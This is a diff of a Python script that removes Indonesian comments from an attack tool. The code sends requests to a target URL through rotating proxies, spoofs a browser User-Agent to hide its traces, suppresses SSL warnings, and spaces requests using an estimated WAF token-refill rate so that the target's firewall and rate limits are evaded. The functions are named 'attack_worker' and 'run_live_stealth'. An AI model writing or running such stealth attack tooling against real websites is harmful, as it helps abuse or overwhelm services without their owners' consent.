@@ -4,7 +4,6 @@ import sys
 import requests
 import urllib3
 
-# Mematikan peringatan SSL jika menghantam target dengan sertifikat bodong
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def attack_worker(target_url, proxy, req_id):
@@ -14,7 +13,6 @@ def attack_worker(target_url, proxy, req_id):
         "https": f"http://{proxy}"
     }
     
-    # Manipulasi Header untuk menyamarkan jejak script
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
@@ -30,7 +28,6 @@ def attack_worker(target_url, proxy, req_id):
         else:
             print(f"[!] Node {proxy.split(':')[0]} | Req {req_id}: [{resp.status_code}] -> WAF Block/Error")
     except Exception as e:
-        # Menangkap error jaringan seperti timeout atau proxy mati
         print(f"[-] Node {proxy.split(':')[0]} | Req {req_id}: [RTO] -> Koneksi Gagal")
 
 def load_proxies(filename="proxies.txt"):
@@ -46,7 +43,6 @@ def run_live_stealth(target_url):
     if not proxy_pool:
         sys.exit(1)
         
-    # Asumsi WAF target memulihkan 1 token per detik. Sesuaikan berdasarkan fase enumerasi Anda.
     estimated_refill_rate = 1 
     safe_delay = 1.0 / (len(proxy_pool) * estimated_refill_rate)
     
